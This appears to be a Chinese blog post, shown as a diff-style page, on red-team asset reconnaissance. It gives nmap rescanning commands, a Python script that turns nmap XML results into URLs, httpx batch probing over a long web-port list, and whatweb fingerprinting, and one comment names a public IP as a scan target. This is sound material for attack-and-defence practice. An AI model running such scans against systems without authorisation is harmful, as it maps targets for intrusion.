+<p>目标防火墙可能导致误报端口全开，如果Nmap根据这个去探测指纹，就天长地久了。（Nmap可能有扫出过多端口丢弃的选项），目前我想到是，用筛出来的出现过的端口，再扫一遍，指纹。</p>
+<pre tabindex="0"><code>nmap -p 【端口1,2,...】-sV -Pn -iL IPs.txt -oX scanbanner.xml
+</code></pre><p>NMAP处理小脚本：</p>
+<pre tabindex="0"><code>#!/bin/python3
+# -*- coding: UTF-8 -*-
+from xml.dom.minidom import parse
+import xml.dom.minidom
+
+#nmap -p- -v 112.94.67.115 -oX scanb.xml
+
+def load_nmap_xml():
+  # 使用minidom解析器打开 XML 文档
+  DOMTree = xml.dom.minidom.parse(&#34;scanb.xml&#34;)
+  if DOMTree.getElementsByTagName(&#34;host&#34;):
+      hosts = DOMTree.getElementsByTagName(&#34;host&#34;) 
+  host_list = list()
+  for host in hosts:
+      address = host.getElementsByTagName(&#34;address&#34;)[0].getAttribute(&#34;addr&#34;)
+      # print(address)
+      ports = host.getElementsByTagName(&#34;port&#34;)
+      port_list = list()
+      for port in ports:
+          if(&#34;open&#34; == port.getElementsByTagName(&#39;state&#39;)[0].getAttribute(&#34;state&#34;)):
+              port_value = port.getAttribute(&#34;portid&#34;)
+              # print(port_value)
+              port_list.append(port_value)
+      if(port_list):
+          host_list.append({&#34;ip&#34;:address, &#34;port_list&#34;:port_list})    
+  # print(host_list)
+  return host_list
+
+#功能一：拼接IP+端口，组成URL
+port_checklist = (&#34;22&#34;,&#34;139&#34;,&#34;53&#34;,&#34;111&#34;,&#34;ssh&#34;,&#34;135&#34;,&#34;445&#34;,&#34;samba&#34;,&#34;mysql&#34;,&#34;3306&#34;,&#34;1521&#34;,&#34;3389&#34;,&#34;21&#34;)
+host_list = load_nmap_xml()
+for host in host_list:
+  for port in host[&#34;port_list&#34;]:
+      if(port in port_checklist):
+          continue
+      url = &#34;http://%s:%s&#34; %(host[&#34;ip&#34;],port)
+      # url = &#34;http://&#34;+str(host[&#34;ip&#34;])+&#34;:&#34;+str(port)
+      print(url)
+
+#功能二：打印所有曾出现的端口
+# port_set = set()
+# for host in host_list:
+#     #单主机有多于25个端口的丢弃
+#     if(len(host[&#34;port_list&#34;])&gt;35):
+#         continue
+
+#     for port in host[&#34;port_list&#34;]:
+#         port_set.add(port)
+
+# print(&#39;,&#39;.join(port_set))
+</code></pre><h2 id="公众号小程序app">公众号/小程序/APP</h2>
+<p>搜索用户的关键字找公众号、小程序。</p>
+<p>拿着burp或者fiddler，看抓到的URL。</p>
+<p>又是手工。哎。</p>
+<h2 id="批量域名端口的https请求">批量域名+端口的HTTP/S请求</h2>
+<p>关注WEB资产，批量，要求返回要素信息，例如标题、响应码、指纹。</p>
+<p>有时候出口网关（负载均衡之类的），根据域名、端口再转发内网，那对域名+端口进行暴发户请求就有必要了，老朋友httpx。</p>
+<p>特别是只有域名的情况。</p>
+<p>httpx的csv格式输出，会有比较齐全的信息列。</p>
+<pre tabindex="0"><code>nohup ./httpx -l urls.txt -p 【端口1,端口2，...】 -sc -fr -title -td -silent -nf -t 100 -o urls.csv -csv &amp;
+</code></pre><p>参考goby的默认端口，删走了几个明显的非WEB端口。</p>
+<pre tabindex="0"><code>80,81,82,83,84,85,86,87,88,89,98,443,444,512,515,540,548,554,564,587,620,631,636,646,666,771,777,789,800,801,808,873,876,880,888,898,900,901,902,990,992,993,994,995,999,1000,1010,1022,1023,1024,1025,1026,1027,1042,1080,1099,1177,1194,1200,1201,1212,1214,1234,1241,1248,1260,1290,1302,1311,1314,1344,1400,1443,1471,1494,1503,1505,1515,1554,1588,1610,1720,1723,1741,1777,1830,1863,1880,1883,1901,1911,1935,1947,1962,1967,1991,2000,2001,2002,2010,2020,2022,2030,2049,2051,2052,2053,2055,2064,2077,2080,2082,2083,2086,2087,2095,2096,2121,2154,2160,2181,2222,2223,2252,2306,2323,2332,2375,2376,2379,2396,2401,2404,2406,2424,2443,2455,2480,2501,2525,2600,2601,2604,2628,2715,2809,2869,3000,3001,3002,3005,3050,3052,3075,3097,3128,3260,3280,3288,3299,3307,3310,3311,3312,3333,3337,3352,3372,3388,3389,3390,3443,3460,3520,3522,3523,3524,3525,3528,3531,3541,3542,3689,3690,3749,3780,3790,4000,4022,4040,4063,4064,4155,4300,4369,4430,4433,4440,4443,4444,4505,4506,4567,4660,4664,4711,4712,4730,4782,4786,4840,4842,4848,4880,4911,4949,5000,5001,5002,5003,5004,5005,5006,5007,5008,5009,5010,5038,5050,5051,5061,5080,5084,5111,5222,5258,5269,5280,5357,5400,5427,5432,5443,5550,5555,5560,5577,5598,5631,5672,5678,5800,5801,5802,5820,5900,5901,5902,5903,5938,5984,5985,5986,6000,6001,6002,6003,6004,6005,6006,6007,6008,6009,6010,6060,6068,6080,6082,6103,6346,6363,6379,6443,6488,6544,6560,6565,6581,6588,6590,6600,6664,6665,6666,6667,6668,6669,6697,6699,6780,6782,6998,7000,7001,7002,7003,7004,7005,7007,7010,7014,7070,7071,7077,7080,7100,7144,7145,7170,7171,7180,7187,7199,7272,7288,7401,7402,7443,7474,7479,7493,7537,7547,7548,7634,7657,7676,7776,7777,7778,7779,7780,7788,7911,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8010,8020,8025,8030,8040,8058,8060,8069,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8111,8112,8118,8123,8125,8126,8129,8138,8139,8140,8159,8161,8181,8182,8194,8200,8222,8291,8332,8333,8334,8351,8377,8378,8388,8443,8444,8480,8500,8529,8545,8546,8554,8649,8686,8765,8800,8834,8880,8881,8882,8883,8884,8885,8886,8887,8888,8889,8890,8899,8983,8999,9000,9001,9002,9003,9004,9005,9006,9007,9008,9009,9010,9030,9042,9050,9051,9080,9083,9090,9091,9100,9151,9191,9200,9292,9295,9300,9306,9333,9334,9418,9443,9444,9446,9527,9530,9595,9653,9668,9700,9711,9801,9864,9869,9870,9876,9943,9944,9981,9997,9999,10000,10001,10003,10005,10030,10035,10162,10243,10250,10255,10332,10333,10443,10554,11001,11211,11300,11310,11371,11965,12000,12300,12345,12999,13579,13666,13720,13722,14000,14147,14265,14443,14534,15000,16000,16010,16030,16922,16923,16992,16993,17000,17988,18000,18001,18080,18081,18086,18245,18246,18264,19150,19888,19999,20000,20332,20547,20880,22105,22222,22335,23023,23424,25000,25010,25105,25565,26214,26470,27015,27016,27017,28017,28080,29876,29999,30001,31337,32400,32770,32771,32773,33338,33890,34567,34599,37215,37777,40000,40001,41795,42873,44158,44818,45554,49151,49152,49153,49154,49155,50000,50050,50060,50070,50075,50090,50100,50111,51106,52869,55442,55553,55555,60001,60010,60030,60443,61613,61616,62078,64738
+</code></pre><h2 id="网页指纹whatweb">网页指纹whatweb</h2>
+<p>之前某大佬整理出巨量whatweb指纹库，收藏一直没用，现在可以一试。</p>
+<p>whatweb不用开-a4扫全指纹，请求太多了。默认策略得了。</p>
+<p>httpx的是参考wappalyzer的数据做指纹，有时候也不太准确，再次抽取确定的URL，用whatweb跑一遍。</p>
+<pre tabindex="0"><code>nohup ./whatweb -i host.txt --log-json=urls.json --no-errors -t 150 &amp;
+</code></pre><p>另一款tideFinger工具没试。</p>
+<h2 id="后续">后续</h2>
+<p>回头看，可以多走走网络资产搜索引擎。fofa、hunter。</p>
+<p>还有些结合fofa的搜集工具。没用上。</p>
+<p>按道理，可以更快省力的找到关键敏感资产。</p>
+<p>红队攻防信息收集向的Ehole、Glass、百度企查查ENscan、小程序APP逆向自动出资产的AppInfoScanner、不用说的fofaviewer</p>
+<p>下次一定。</p>
+<p>还有就是输出效果的问题，还是只做到Excel一张表的效果。</p>
+<p>应该设计些展示花哨的图表，划分资产类型，应用类型筛选等等。</p>
+<p>goby可能有指导作用，但是还没玩明白它的资产展示窗口。</p>
+<p>############</p>
+<p>非技术公众号，碰巧个人碎碎念还没什么想法，就发这篇做处女秀。</p>
+  </section>
+
+  <section>
+    
+      
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>第一篇</b><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前期">前期</a></li>
+    <li><a href="#收集期">收集期</a></li>
+    <li><a href="#攻坚期">攻坚期</a></li>
+    <li><a href="#收获期">收获期</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#telnet保障">Telnet保障</a></li>
+    <li><a href="#for-openssl111x">For OpenSSL1.1.1x</a></li>
+    <li><a href="#for-openssh89">For OpenSSH8.9</a></li>
+    <li><a href="#for-openssl102x">For OpenSSL1.0.2x</a></li>
+    <li><a href="#抢修方案">抢修方案</a></li>
+    <li><a href="#堡垒机太老---no-hostkey-algon-openssh-88ssh-rsa">堡垒机太老 - no hostkey alg.(On OpenSSH 8.8+,SSH-RSA)</a></li>
+    <li><a href="#特别为你-errorsanswers">特别为你 Errors&amp;Answers</a>
+      <ul>
+        <li><a href="#1errorencctext0x1223-undefined-reference-to-bio_f_zlib">1、ERROR:enc.c:(.text+0x1223): undefined reference to `BIO_f_zlib'</a></li>
+        <li><a href="#2openssl编译报错cryptothreads_pthreadc48-error-pthread_mutex_recursive">2、OpenSSL编译报错:crypto/threads_pthread.c:48: error: `PTHREAD_MUTEX_RECURSIVE'</a></li>
+        <li><a href="#3sshd_config-line-72-unsupported-option-gssapiauthentication">3、sshd_config line 72: Unsupported option GSSAPIAuthentication</a></li>
+        <li><a href="#4configure-error--zlibh-missing---please-install-first-or-check-configlog">4、configure: error: *** zlib.h missing - please install first or check config.log**</a></li>
+        <li><a href="#5编译openssh的依赖软件包">5、编译OpenSSH的依赖软件包</a></li>
+        <li><a href="#6error15-解决-sshd-no-hostkeys-available">6、Error(15) 解决 sshd: no hostkeys available</a></li>
+        <li><a href="#7your-openssl-headers-do-not-match-your-library">7、Your OpenSSL headers do not match your library.</a></li>
+        <li><a href="#8插曲-乱装rpm的余波">8、插曲-乱装RPM的余波</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#nmap调优">Nmap调优</a></li>
+    <li><a href="#nmap导出整理">Nmap导出整理</a></li>
+    <li><a href="#公众号小程序app">公众号/小程序/APP</a></li>
+    <li><a href="#批量域名端口的https请求">批量域名+端口的HTTP/S请求</a></li>
+    <li><a href="#网页指纹whatweb">网页指纹whatweb</a></li>
+    <li><a href="#后续">后续</a></li>
+  </ul>
+</nav></div>
+  
+
+  
+    
+    
+      <div>
+        
+
+        
+
+        
+
+        
+          <a data-pocket-label="pocket" data-pocket-count="none" class="pocket-btn" data-lang="en"></a>
+          <script type="text/javascript">!function(d,i){if(!d.getElementById(i)){var j=d.createElement("script");j.id=i;j.src="https://widgets.getpocket.com/v1/j/btn.js?v=1";var w=d.getElementById(i);d.body.appendChild(j);}}(document,"pocket-btn-js");</script>
+        
+
+      </div>
+    
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    © jyufu 2020-2023 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
